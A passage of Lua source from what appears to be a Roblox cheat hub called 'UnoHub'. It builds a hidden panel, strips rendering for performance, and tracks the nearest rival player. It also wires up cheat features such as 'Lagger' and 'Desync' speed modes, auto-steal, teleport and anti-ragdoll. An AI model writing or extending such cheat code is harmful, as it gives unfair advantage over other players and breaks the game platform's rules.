	if mx and my then _G["_UnoHub_UI_MenuPos"] = { x = tonumber(mx), y = tonumber(my) } end
	elseif k == "toggleBtn" then
	local bx, by = v:match("(-?%d+),(-?%d+)")
	if bx and by then _G["_UnoHub_UI_BtnPos"] = { x = tonumber(bx), y = tonumber(by) } end
	elseif k == "speedFrame" then
	local sx, sy = v:match("(-?%d+),(-?%d+)")
	if sx and sy then _G["_UnoHub_UI_SpeedFramePos"] = { x = tonumber(sx), y = tonumber(sy) } end
	elseif k == "enemyWidget" then
	local ex, ey = v:match("(-?%d+),(-?%d+)")
	if ex and ey then _G["_UnoHub_UI_EnemyWidgetPos"] = { x = tonumber(ex), y = tonumber(ey) } end
	elseif k == "autoGrabBar" then
	local ax, ay = v:match("(-?%d+),(-?%d+)")
	if ax and ay then _G["_UnoHub_UI_AutoGrabBarPos"] = { x = tonumber(ax), y = tonumber(ay) } end
	elseif k == "autoGrabBarSize" then
	local num = tonumber(v)
	if num then _G["_UnoHub_UI_AutoGrabBarSize"] = num end
	elseif k == "modernMini" then
	local mx, my = v:match("(-?%d+),(-?%d+)")
	if mx and my then _G["_UnoHub_UI_ModernMiniPos"] = { x = tonumber(mx), y = tonumber(my) } end
	else
	local quickName = k:match("^quickBtn_(.+)$")
	if quickName then
	local qx, qy = v:match("^(-?%d+),(-?%d+)")
	if qx and qy then quickButtonPositions[quickName] = { x = tonumber(qx), y = tonumber(qy) } end
	else
	local mobileName = k:match("^mobileBtn_(.+)$")
	if mobileName then
	local bx, by = v:match("^(-?%d+),(-?%d+)")
	if bx and by then
	_G["_UnoHub_UI_MobileBtnPos"] = _G["_UnoHub_UI_MobileBtnPos"] or {}
	local pos = { x = tonumber(bx), y = tonumber(by) }
	local sx, sy = v:match(":(-?%d+):(-?%d+)$")
	if sx and sy then pos.xs = tonumber(sx); pos.ys = tonumber(sy) end
	_G["_UnoHub_UI_MobileBtnPos"][mobileName] = pos
	end
	end
	end
	end
	end
	end
	end
	end
	loadConfig()
	refreshVioletteSkinCatalog()
	if type(_G.__UnoPanelVisible) == "boolean" then
	toggleStates["Toggle UI"] = _G.__UnoPanelVisible
	else
	_G.__UnoPanelVisible = toggleStates["Toggle UI"] ~= false
	toggleStates["Toggle UI"] = _G.__UnoPanelVisible
	end
	if autoStealMode ~= "v1" and autoStealMode ~= "v2" then autoStealMode = "v1" end
	carrySpeedMode = "v2"
	_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
	_G.__tpBatV2Distance = math.clamp(tonumber(_G.__tpBatV2Distance) or 8, 0, 100)
	laggerEnabled = (selectedMode == "Lagger")
	speedToggled = toggleStates["Carry Speed"]
	toggleStates["TP Bat"] = false
	-- The steal bar is a HUD element: always show it when the hub starts.
	-- It can still be hidden manually from the Combat tab.
	toggleStates["Steal Bar"] = true
	toggleStates["Korblox"] = false
	pcall(function()
	local character = Player.Character
	if not character then return end
	for _, child in ipairs(character:GetChildren()) do
	if child.Name == "Korblox_RightLeg" then
	child:Destroy()
	end
	end
	for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
	local limb = character:FindFirstChild(partName)
	if limb and limb:IsA("BasePart") then
	limb.Transparency = 0
	limb.CanCollide = true
	end
	end
	end)
	toggleStates["Autoplay"] = false
	toggleStates["Lagger"] = false

	mobileButtonPositions = _G["_UnoHub_UI_MobileBtnPos"] or {}

	_G.__UnoModernGuiActive = true
	local coreGui = game:GetService("CoreGui")
	local existing = Player.PlayerGui:FindFirstChild("UNO_Panel") or coreGui:FindFirstChild("UNO_Panel")
	if existing then existing:Destroy() end

	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "UnoHub"

	ScreenGui.Enabled = false
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.DisplayOrder = 9999999
	ScreenGui.IgnoreGuiInset = true
	pcall(function() ScreenGui.Parent = coreGui end)
	if not ScreenGui.Parent then ScreenGui.Parent = Player.PlayerGui end

	local vp = workspace.CurrentCamera.ViewportSize
	GUI_METRICS = {
	sectionPad = isMobile and 4 or 6, sectionGap = isMobile and 4 or 6,
	sectionHeaderH = isMobile and 16 or 20, toggleH = isMobile and 44 or 62,
	compactRowH = isMobile and 30 or 36, compactCardH = isMobile and 28 or 32,
	toggleTextSize = isMobile and 9 or 10, bindW = isMobile and 34 or 40,
	bindH = isMobile and 16 or 20, bindTextSize = isMobile and 8 or 9,
	}
	local PANEL_W = isMobile and math.clamp(math.floor(vp.X * 0.42), 165, 205) or math.min(340, math.floor(vp.X * 0.52))
	local PANEL_H = isMobile and math.clamp(math.floor(vp.Y * 0.52), 200, 310) or math.min(520, math.floor(vp.Y * 0.80))

	local Panel = Instance.new("Frame")
	Panel.Name = "Panel"
	Panel.Active = true
	Panel.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
	local savedMenuPos = _G["_UnoHub_UI_MenuPos"]
	if savedMenuPos then
	local mx, my = placeInsideViewport(Panel, 0, savedMenuPos.x, 0, savedMenuPos.y)
	Panel.Position = UDim2.new(0, mx, 0, my)
	else
	Panel.Position = UDim2.new(1, -PANEL_W - 20, 0.5, -PANEL_H / 2)
	end
	Panel.BackgroundTransparency = 1
	Panel.BorderSizePixel = 0
	Panel.Visible = false
	Panel.Parent = ScreenGui

	local SidebarHeader = Instance.new("Frame")
	SidebarHeader.Name = "LegacyHeaderStub"
	SidebarHeader.BackgroundTransparency = 1
	SidebarHeader.Visible = false
	SidebarHeader.Parent = Panel
	FPSLabel = Instance.new("TextLabel")
	FPSLabel.BackgroundTransparency = 1
	FPSLabel.Visible = false
	FPSLabel.Parent = SidebarHeader
	PingLabel = Instance.new("TextLabel")
	PingLabel.BackgroundTransparency = 1
	PingLabel.Visible = false
	PingLabel.Parent = SidebarHeader

	local ContentArea = Instance.new("Frame")
	ContentArea.Name = "LegacyContentStub"
	ContentArea.BackgroundTransparency = 1
	ContentArea.Visible = false
	ContentArea.Parent = Panel

	local backgroundIds = { "rbxassetid://103227442296796", "rbxassetid://122681335625484", "rbxassetid://84116345279515" }
	local HALLOWEEN_BACKGROUND = "rbxassetid://136847432500889"
	local bgIndex = tonumber(_G["_UnoHub_UI_BgIndex"]) or 1
	if type(bgIndex) ~= "number" or bgIndex < 1 or bgIndex > #backgroundIds then bgIndex = 1 end
	local BgImage = Instance.new("ImageLabel")
	BgImage.Name = "LegacyBackgroundStub"
	BgImage.BackgroundTransparency = 1
	BgImage.Image = backgroundIds[bgIndex]
	BgImage.Visible = false
	BgImage.Parent = Panel
	local HeaderBgBtn = Instance.new("TextButton")
	HeaderBgBtn.Name = "LegacyBackgroundButtonStub"
	HeaderBgBtn.Visible = false
	HeaderBgBtn.Parent = Panel

	do
	local fpsBoostDescConn = nil
	local fpsBoostCharConn = nil
	local fpsBoostActive = false
	local fpsBoostWalkCancel = nil

	local function applyFPSDerender(obj)
	pcall(function()
	if _G.__UnoPreserveOptimizerUI(obj) then return end

	local ok, inLighting = pcall(function() return obj:IsDescendantOf(game:GetService("Lighting")) end)
	if ok and inLighting then return end
	if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("ColorCorrectionEffect") or obj:IsA("BloomEffect") or obj:IsA("BlurEffect") or obj:IsA("SunRaysEffect") or obj:IsA("DepthOfFieldEffect") then return end

	local ok2, inChar = pcall(function()
	local p = obj
	while p and p ~= workspace do
	if p.Name == "Headless_Headless" or p.Name:find("^Korblox_") then return true end
	p = p.Parent
	end
	return false
	end)
	if ok2 and inChar then return end
	if obj:IsA("Accessory") or obj:IsA("Hat") then
	obj:Destroy()
	elseif obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("ShirtGraphic") or obj:IsA("BodyColors") or obj:IsA("CharacterMesh") then
	obj:Destroy()
	elseif obj:IsA("BasePart") then
	obj.Material = Enum.Material.Plastic
	obj.Reflectance = 0
	obj.CastShadow = false
	elseif obj:IsA("Decal") or obj:IsA("Texture") then

	obj.Transparency = 1
	elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
	obj.Enabled = false
	elseif obj:IsA("AnimationController") or obj:IsA("Animator") then

	local ancestor = obj.Parent
	while ancestor and ancestor ~= workspace do
	if ancestor:IsA("Model") and Players:GetPlayerFromCharacter(ancestor) then return end
	ancestor = ancestor.Parent
	end
	for _, t in ipairs(obj:GetPlayingAnimationTracks()) do
	pcall(function() t:Stop(0) end)
	end
	end
	end)
	end

	local function processAllDescendants()
	if fpsBoostWalkCancel then fpsBoostWalkCancel() end
	fpsBoostWalkCancel = _G.__UnoWalkDescendantsBatched(workspace, applyFPSDerender, function()
	return fpsBoostActive
	end)
	end

	local function startFPSBoost()
	if fpsBoostActive then return end
	fpsBoostActive = true

if fpsBoostDescConn then fpsBoostDescConn:Disconnect() end
	fpsBoostDescConn = workspace.DescendantAdded:Connect(function(obj)
	if fpsBoostActive then
	applyFPSDerender(obj)
	end
end)
processAllDescendants()

if fpsBoostCharConn then fpsBoostCharConn:Disconnect() end
	fpsBoostCharConn = Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	if fpsBoostActive then
	_G.__UnoWalkDescendantsBatched(char, applyFPSDerender, function() return fpsBoostActive end)
	end
	end)

end

	local function stopFPSBoost()
	if not fpsBoostActive then return end
	fpsBoostActive = false
	if fpsBoostWalkCancel then fpsBoostWalkCancel(); fpsBoostWalkCancel = nil end

	if fpsBoostDescConn then
	fpsBoostDescConn:Disconnect()
	fpsBoostDescConn = nil
	end
	if fpsBoostCharConn then
	fpsBoostCharConn:Disconnect()
	fpsBoostCharConn = nil
	end
	end

	_G.__refreshFPSBoost = startFPSBoost
	_G.__stopFPSBoost = stopFPSBoost

	FeaturePostToggle["FPS Boost"] = function(active)
	if active then startFPSBoost() else stopFPSBoost() end
	end

	end

	;(function()
	local active, generation = false, 0
	local connections = {}
	local saved = setmetatable({}, { __mode = "k" })
	local detached = {}
	local animators = setmetatable({}, { __mode = "k" })
	local stoppedTracks = setmetatable({}, { __mode = "k" })
	local scanCancel = nil

	local function change(object, property, value)
	pcall(function()
	local original = object[property]
	if original == value then return end
	object[property] = value
	local properties = saved[object]
	if not properties then properties = {}; saved[object] = properties end
	if not properties[property] then properties[property] = { value = original } end
	end)
	end

	local function isProtectedVisual(object)
	local char = Player.Character
	if char and (object == char or object:IsDescendantOf(char)) then return true end

	local parent = object
	while parent and parent ~= workspace do
	if parent:IsA("LayerCollector") or parent:IsA("GuiObject")
	or parent:IsA("GuiBase2d") then return true end
	local name = parent.Name or ""
	if name:match("^Uno") or name:match("^__Uno") or name:match("^Uno")
	or name:match("^ESP_") or name:match("^Korblox_")
	or name == "Headless_Headless" or name == "GreenDuelsBB"
	or name == "PredictionSphere" then return true end
	parent = parent.Parent
	end
	if toggleStates["Sky Changer"] and (object == Lighting or object:IsDescendantOf(Lighting)) then return true end
	return false
	end

	local function stopAnimations(animator)
	if animators[animator] then return end

	local char = Player.Character
	if char and animator:IsDescendantOf(char) then return end
	animators[animator] = true
	local token = generation
	local ok, connection = pcall(function()
	return animator.AnimationPlayed:Connect(function(track)
	if not active or generation ~= token then return end

	task.defer(function()
	if active and generation == token then pcall(function() track:Stop(0) end) end
	end)
	end)
	end)
	if ok then table.insert(connections, connection) end
	pcall(function()
	for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
	if track.IsPlaying then
	stoppedTracks[track] = { animator = animator, time = track.TimePosition, speed = track.Speed }
	track:Stop(0)
	end
	end
	end)
	end

	local function apply(object)
	if not active or isProtectedVisual(object) then return end
	if object:IsA("Terrain") then
	change(object, "Decoration", false)
	change(object, "WaterWaveSize", 0)
	change(object, "WaterWaveSpeed", 0)
	change(object, "WaterReflectance", 0)
	change(object, "WaterTransparency", 1)
	end
	if object:IsA("BasePart") then
	change(object, "Material", Enum.Material.Plastic)
	change(object, "MaterialVariant", "")
	change(object, "Reflectance", 0)
	change(object, "CastShadow", false)
	if object:IsA("MeshPart") then
	change(object, "TextureID", "")
	change(object, "RenderFidelity", Enum.RenderFidelity.Performance)
	change(object, "DoubleSided", false)
	elseif object:IsA("PartOperation") then
	change(object, "RenderFidelity", Enum.RenderFidelity.Performance)
	end
	elseif object:IsA("SpecialMesh") then
	change(object, "TextureId", "")
	elseif object:IsA("SurfaceAppearance") then
	detached[object] = true
	change(object, "Parent", nil)
	elseif object:IsA("Decal") or object:IsA("Texture") then
	change(object, "Transparency", 1)
	change(object, "Texture", "")
	elseif object:IsA("ParticleEmitter") then
	change(object, "Enabled", false)
	change(object, "Rate", 0)
	pcall(function() object:Clear() end)
	elseif object:IsA("Trail") then
	change(object, "Enabled", false)
	pcall(function() object:Clear() end)
	elseif object:IsA("Beam") or object:IsA("Fire") or object:IsA("Smoke")
	or object:IsA("Sparkles") or object:IsA("Light") or object:IsA("PostEffect")
	or object:IsA("Clouds") then
	change(object, "Enabled", false)
	elseif object:IsA("Atmosphere") then
	change(object, "Density", 0)
	change(object, "Haze", 0)
	change(object, "Glare", 0)
	elseif object:IsA("Sky") then
	for _, face in ipairs({"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp", "SunTextureId", "MoonTextureId"}) do
	change(object, face, "")
	end
	change(object, "StarCount", 0)
	change(object, "CelestialBodiesShown", false)
	elseif object:IsA("Shirt") then
	change(object, "ShirtTemplate", "")
	elseif object:IsA("Pants") then
	change(object, "PantsTemplate", "")
	elseif object:IsA("ShirtGraphic") then
	change(object, "Graphic", "")
	elseif object:IsA("Animator") then
	stopAnimations(object)
	end
	end

	local function applyLighting()
	if toggleStates["Sky Changer"] then return end
	change(Lighting, "GlobalShadows", false)
	change(Lighting, "EnvironmentDiffuseScale", 0)
	change(Lighting, "EnvironmentSpecularScale", 0)
	change(Lighting, "FogStart", 0)
	change(Lighting, "FogEnd", 1e10)
	end

	local function stop()
	if not active then return end
	active = false
	generation += 1
	if scanCancel then scanCancel(); scanCancel = nil end
	for _, connection in ipairs(connections) do pcall(function() connection:Disconnect() end) end
	connections = {}

	for object, properties in pairs(saved) do
	for property, original in pairs(properties) do
	pcall(function() object[property] = original.value end)
	end
	end
	saved = setmetatable({}, { __mode = "k" })
	detached = {}
	animators = setmetatable({}, { __mode = "k" })
	for track, state in pairs(stoppedTracks) do
	pcall(function()
	if state.animator.Parent and not track.IsPlaying then
	track:Play(0, 1, state.speed)
	track.TimePosition = state.time
	end
	end)
	end
	stoppedTracks = setmetatable({}, { __mode = "k" })
	end

	FeaturePostToggle["Anti Lag"] = function(enabled)
	if not enabled then stop(); return end
	if active then return end
	active = true
	generation += 1
	local token = generation
	applyLighting()
	pcall(function() change(settings().Rendering, "QualityLevel", Enum.QualityLevel.Level01) end)
	pcall(function()
	change(UserSettings():GetService("UserGameSettings"), "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
	end)
	for _, root in ipairs({ workspace, Lighting }) do
	table.insert(connections, root.DescendantAdded:Connect(function(object)
	task.defer(function()
	if active and generation == token then pcall(apply, object) end
	end)
	end))
	end
	table.insert(connections, Lighting.Changed:Connect(function(property)
	if active and (property == "GlobalShadows" or property == "EnvironmentDiffuseScale"
	or property == "EnvironmentSpecularScale" or property == "FogStart" or property == "FogEnd") then
	applyLighting()
	end
	end))
	if scanCancel then scanCancel() end
	scanCancel = _G.__UnoWalkDescendantsBatched({ workspace, Lighting }, apply, function()
	return active and generation == token
	end)
	end
	_G.__UnoTrackStopper(stop)

	end)()

	do
	local currentFps, currentPing = 0, 0
	local fpsElapsed, fpsFrames = 0, 0
	local topFpsConn = nil

	local function safeGetPing()
	local ok, ping = pcall(function() return Player:GetNetworkPing() * 1000 end)
	if ok and type(ping) == "number" then return math.floor(ping) end
	return 0
	end

	local function updateTopLabel()
	if FPSLabel then FPSLabel.Text = tostring(currentFps) .. " FPS" end
	if PingLabel then PingLabel.Text = tostring(currentPing) .. " MS" end
	if StatsRightFps then StatsRightFps.Text = "FPS: " .. tostring(currentFps) end
	if StatsRightPing then StatsRightPing.Text = "PING: " .. tostring(currentPing) .. "ms" end
	end

	if topFpsConn then return end
	fpsElapsed = 0; fpsFrames = 0
	topFpsConn = _G.__UnoTrackConn(RunService.RenderStepped:Connect((function(dt)
	fpsFrames = fpsFrames + 1; fpsElapsed = fpsElapsed + dt
	if fpsElapsed >= 1 then
	currentFps = math.floor((fpsFrames / fpsElapsed) + 0.5); fpsFrames = 0; fpsElapsed = 0
	currentPing = safeGetPing()
	updateTopLabel()
	end
	end)))

	end

	do
	local enemyWidget = nil
	local enemyWidgetDragging, enemyWidgetDragStart, enemyWidgetStartPos = false, nil, nil
	local enemyWidgetPos = _G["_UnoHub_UI_EnemyWidgetPos"] or { x = 140, y = -340 }
	_G.__UnoGuiPositionResetters.EnemyWidget = function()
	enemyWidgetDragging = false
	enemyWidgetPos = { x = 140, y = -340 }
	_G["_UnoHub_UI_EnemyWidgetPos"] = nil
	if enemyWidget and enemyWidget.Parent then
	enemyWidget.Position = UDim2.fromOffset(enemyWidgetPos.x, enemyWidgetPos.y)
	end
	end
	local enemyRagdollCountdown = 0
	local trackedEnemy = nil
	local trackedEnemyId = nil
	local lastEnemyRagdollState = false
	local cachedTimerLbl = nil
	local cachedEnemyHum = nil
	local lastTimerText = ""
	local lastWidgetVisible = nil

	_G.__UnoGetVisualEnemy = function()
	if trackedEnemy and trackedEnemy.Parent == Players then return trackedEnemy end
	return nil
	end

	local function createEnemyWidget()
	if enemyWidget and enemyWidget.Parent then return enemyWidget end

	enemyWidget = Instance.new("Frame", ScreenGui)
	enemyWidget.Name = "UnoEnemyWidget"
	enemyWidget.Size = UDim2.new(0, 140, 0, 80)
	enemyWidget.Position = UDim2.new(0, enemyWidgetPos.x, 0, enemyWidgetPos.y)
	_G.__enemyWidget = enemyWidget
	_G.__UnoRegisterThemeRoot(enemyWidget)
	enemyWidget.BackgroundTransparency = 0.15
	enemyWidget.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	enemyWidget.ZIndex = 600
	enemyWidget.Visible = false
	Instance.new("UICorner", enemyWidget).CornerRadius = UDim.new(0, 8)
	local stroke = Instance.new("UIStroke", enemyWidget)
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 1

	local titleLbl = Instance.new("TextLabel", enemyWidget)
	titleLbl.Name = "EWTitle"
	titleLbl.Size = UDim2.new(1, -10, 0, 14)
	titleLbl.Position = UDim2.new(0, 8, 0, 4)
	titleLbl.BackgroundTransparency = 1
	titleLbl.Text = "RIVAL"
	titleLbl.Font = Enum.Font.GothamBold
	titleLbl.TextSize = 10
	titleLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
	titleLbl.TextXAlignment = Enum.TextXAlignment.Left
	titleLbl.ZIndex = 601

	local avatarImg = Instance.new("ImageLabel", enemyWidget)
	avatarImg.Name = "EWAvatar"
	avatarImg.Size = UDim2.new(0, 44, 0, 44)
	avatarImg.Position = UDim2.new(0, 6, 0, 20)
	avatarImg.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	avatarImg.BorderSizePixel = 0
	avatarImg.Image = ""
	avatarImg.ZIndex = 601
	Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(0, 6)
	local avatarStroke = Instance.new("UIStroke", avatarImg)
	avatarStroke.Color = Color3.fromRGB(180, 180, 180)
	avatarStroke.Thickness = 1

	local nameLbl = Instance.new("TextLabel", enemyWidget)
	nameLbl.Name = "EWName"
	nameLbl.Size = UDim2.new(1, -60, 0, 18)
	nameLbl.Position = UDim2.new(0, 56, 0, 22)
	nameLbl.BackgroundTransparency = 1
	nameLbl.Text = "---"
	nameLbl.Font = Enum.Font.GothamBold
	nameLbl.TextSize = 13
	nameLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
	nameLbl.TextXAlignment = Enum.TextXAlignment.Left
	nameLbl.TextScaled = false

	local timerLbl = Instance.new("TextLabel", enemyWidget)
	timerLbl.Name = "EWTimer"
	timerLbl.Size = UDim2.new(1, -60, 0, 20)
	timerLbl.Position = UDim2.new(0, 56, 0, 44)
	timerLbl.BackgroundTransparency = 1
	timerLbl.Text = ""
	timerLbl.Font = Enum.Font.GothamBlack
	timerLbl.TextSize = 16
	timerLbl.TextColor3 = Color3.fromRGB(255, 221, 0)
	timerLbl.TextXAlignment = Enum.TextXAlignment.Left
	timerLbl.ZIndex = 601

	enemyWidget.InputBegan:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
	enemyWidgetDragging = true
	enemyWidgetDragStart = inp.Position
	enemyWidgetStartPos = enemyWidget.Position
	inp.Changed:Connect(function()
	if inp.UserInputState == Enum.UserInputState.End then
	enemyWidgetDragging = false
	enemyWidgetPos.x = enemyWidget.Position.X.Offset
	enemyWidgetPos.y = enemyWidget.Position.Y.Offset
	_G["_UnoHub_UI_EnemyWidgetPos"] = { x = enemyWidgetPos.x, y = enemyWidgetPos.y }
	saveConfig()
	end
	end)
	end
	end)
	_G.__UnoTrackConn(UserInputService.InputChanged:Connect((function(inp)
	if not enemyWidgetDragging then return end
	if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
	local delta = inp.Position - enemyWidgetDragStart
	local vs = workspace.CurrentCamera.ViewportSize
	local nx = math.clamp(enemyWidgetStartPos.X.Offset + delta.X, 0, vs.X - enemyWidget.AbsoluteSize.X)
	local ny = math.clamp(enemyWidgetStartPos.Y.Offset + delta.Y, 0, vs.Y - enemyWidget.AbsoluteSize.Y)
	enemyWidget.Position = UDim2.new(0, nx, 0, ny)
	end)))

	return enemyWidget
	end

	local function loadEnemyThumbnail(userId)
	local w = createEnemyWidget()
	local avatarImg = w:FindFirstChild("EWAvatar")
	if not avatarImg then return end
	avatarImg.Image = ""
	task.spawn(function()
	local ok, img = pcall(function()
	return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
	end)
	if ok and img and avatarImg and avatarImg.Parent then
	avatarImg.Image = img
	end
	end)
	end

	local function setTrackedEnemy(player)
	if player and trackedEnemy and player.UserId == trackedEnemyId then return end
	if not player and not trackedEnemy then return end
	trackedEnemy = player
	lastEnemyRagdollState = false
	cachedEnemyHum = nil

	local w = createEnemyWidget()
	local nameLbl = w:FindFirstChild("EWName")
	cachedTimerLbl = w:FindFirstChild("EWTimer")

	if player then
	trackedEnemyId = player.UserId
	if nameLbl then nameLbl.Text = player.Name end
	if cachedTimerLbl then cachedTimerLbl.Text = ""; lastTimerText = "" end
	loadEnemyThumbnail(player.UserId)
	w.Visible = true; lastWidgetVisible = true
	else
	trackedEnemyId = nil
	if nameLbl then nameLbl.Text = "---" end
	if cachedTimerLbl then cachedTimerLbl.Text = ""; lastTimerText = "" end
	local avatarImg = w:FindFirstChild("EWAvatar")
	if avatarImg then avatarImg.Image = "" end
	w.Visible = false; lastWidgetVisible = false
	end
	end

	local function updateEnemyTimer(dt)
	if enemyRagdollCountdown > 0 then
	enemyRagdollCountdown = math.max(0, enemyRagdollCountdown - dt)
	end
	local timerLbl = cachedTimerLbl
	if not timerLbl or not timerLbl.Parent then return end
	if enemyRagdollCountdown > 0 then
	local newText = string.format("%.1fs", enemyRagdollCountdown)
	if newText ~= lastTimerText then
	timerLbl.Text = newText
	timerLbl.TextColor3 = Color3.fromRGB(255, 221, 0)
	lastTimerText = newText
	end
	elseif lastTimerText ~= "" then
	timerLbl.Text = ""
	lastTimerText = ""
	end
	end

	local ewLastScan = 0
	local ewTimerAcc = 0
	_G.__UnoTrackConn(RunService.Heartbeat:Connect((function(dt)

	ewTimerAcc = ewTimerAcc + (dt or 0)
	if trackedEnemy and ewTimerAcc >= 0.20 then
	updateEnemyTimer(ewTimerAcc)
	ewTimerAcc = 0
	elseif not trackedEnemy and ewTimerAcc >= 0.20 then
	ewTimerAcc = 0
	end

	local now = os.clock()
	if now - ewLastScan < 0.25 then return end
	ewLastScan = now

	local myChar = Player.Character
	local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
	if not myHRP then return end

	local myPos = myHRP.Position
	local closest = nil
	local closestDist = math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
	local character = plr ~= Player and plr.Character
	if character then
	local hrp = character:FindFirstChild("HumanoidRootPart")
	if hrp then
	local position = hrp.Position
	local dx = myPos.X - position.X
	local dy = myPos.Y - position.Y
	local dz = myPos.Z - position.Z
	local d = dx*dx + dy*dy + dz*dz
	if d < closestDist then
	closestDist = d
	closest = plr
	end
	end
	end
	end

	if closest ~= trackedEnemy then
	setTrackedEnemy(closest)
	end

	local w = enemyWidget
	if w and w.Parent then
	local shouldShow = closest ~= nil
	if shouldShow ~= lastWidgetVisible then
	w.Visible = shouldShow
	lastWidgetVisible = shouldShow
	end
	end

	if trackedEnemy then
	local nameLbl = w and w:FindFirstChild("EWName")
	if nameLbl then
	if trackedEnemy:GetAttribute("Stealing") == true then
	nameLbl.TextColor3 = Color3.fromRGB(255, 60, 60)
	else
	nameLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
	end
	end
	end

	if trackedEnemy and trackedEnemy.Character then
	if not cachedEnemyHum or not cachedEnemyHum.Parent then
	cachedEnemyHum = trackedEnemy.Character:FindFirstChildOfClass("Humanoid")
	end
	if cachedEnemyHum then
	local state = cachedEnemyHum:GetState()
	local isRagdolled = (
	state == Enum.HumanoidStateType.Physics or
	state == Enum.HumanoidStateType.Ragdoll or
	state == Enum.HumanoidStateType.FallingDown
	)
	if isRagdolled and not lastEnemyRagdollState then
	enemyRagdollCountdown = 3.0
	elseif isRagdolled and enemyRagdollCountdown < 0.5 then

	enemyRagdollCountdown = 0.5
	end
	lastEnemyRagdollState = isRagdolled
	end
	end
	end)))

	_G["_UnoHub_EnemyWidget_SaveHook"] = function()
	if enemyWidget and enemyWidget.Parent then
	enemyWidgetPos.x = enemyWidget.Position.X.Offset
	enemyWidgetPos.y = enemyWidget.Position.Y.Offset
	_G["_UnoHub_UI_EnemyWidgetPos"] = { x = enemyWidgetPos.x, y = enemyWidgetPos.y }
	end
	end

	createEnemyWidget()
	end

	local function makeUraniumSection(parent, title)
	local section = Instance.new("Frame")
	section.Name = (title and tostring(title) or "Section") .. "SectionStub"
	section.BackgroundTransparency = 1
	section.Visible = false
	section.Parent = parent
	return section
	end

	local function makeToggle(parent, text, featureName, buildExtensionContent)
	local container = Instance.new("Frame")
	container.Name = tostring(featureName or text or "Toggle") .. "Stub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	if buildExtensionContent then
	local card = Instance.new("TextButton")
	card.Text = ""
	card.Parent = container
	local extension = Instance.new("Frame")
	extension.BackgroundTransparency = 1
	extension.Parent = container
	buildExtensionContent(extension)
	end
	return container
	end

	local function makeToggleNoKeybind(parent, text, featureName)
	local container = Instance.new("Frame")
	container.Name = tostring(featureName or text or "Toggle") .. "Stub"
	container.BackgroundTransparency = 1
	container.Visible = false
	container.Parent = parent
	return container
	end

	local function selectMode(mode)

	toggleStates["Speed Boost"] = true
	if _G.__refreshSpeedBoost then pcall(_G.__refreshSpeedBoost) end
	if selectedMode == mode then
	if carrySpeedMode == "v2" then
	speedToggled = not speedToggled
	toggleStates["Carry Speed"] = speedToggled
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	pcall(function() if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end end)
	saveConfig()
	end
	return
	end

	if _G.__UnoResetSpeedDirection then pcall(_G.__UnoResetSpeedDirection) end
	selectedMode = mode
	if mode == "Lagger" then
	laggerEnabled = true
	else
	laggerEnabled = false
	end
	for _, ref in ipairs(_speedCardRefs) do
	if ref.updateVisual then pcall(ref.updateVisual) end
	end
	saveConfig()
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end

	FeatureToggles = FeatureToggles or {}
	FeatureToggles["SelectNormalMode"] = function() selectMode("Normal") end
	FeatureToggles["SelectLaggerMode"] = function() selectMode("Lagger") end
	FeatureToggles["SelectDesyncMode"] = function() selectMode("Desync") end
	FeatureToggles["Toggle UI"] = function()

	if _G.__setPanelVisible then
	_G.__setPanelVisible(not Panel.Visible)
	else
	panelVisible = not Panel.Visible
	Panel.Visible = panelVisible
	toggleStates["Toggle UI"] = panelVisible
	end
	if toggleVisualUpdaters["Toggle UI"] then toggleVisualUpdaters["Toggle UI"]() end
	saveConfig()
	end
	local function getSelectedBoostSpeed()
	if selectedMode == "Lagger" or laggerEnabled then
	return speedValues.LaggerBoost or laggerSpeed
	elseif selectedMode == "Desync" then
	return speedValues.DesyncBoost or normalSpeed
	end
	for _, cs in ipairs(customSpeeds) do
	if selectedMode == cs.name then return cs.boost end
	end
	return speedValues.NormalBoost or normalSpeed
	end

	local AntiRagdollV2 = {
	Enabled = false,
	Connection = nil,
	ResetCooldown = 0,
	}

	local function startAntiRagdoll()
	if AntiRagdollV2.Connection then return end
	AntiRagdollV2.Enabled = true
	AntiRagdollV2.Connection = RunService.Heartbeat:Connect((function()
	if not toggleStates["Anti Ragdoll"] then return end
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if not hum or not root or hum.Health <= 0 then return end

	if _G.dropActive then return end
	local state = hum:GetState()
	local now = tick()
	if state == Enum.HumanoidStateType.Physics or
	state == Enum.HumanoidStateType.Ragdoll or
	state == Enum.HumanoidStateType.FallingDown then
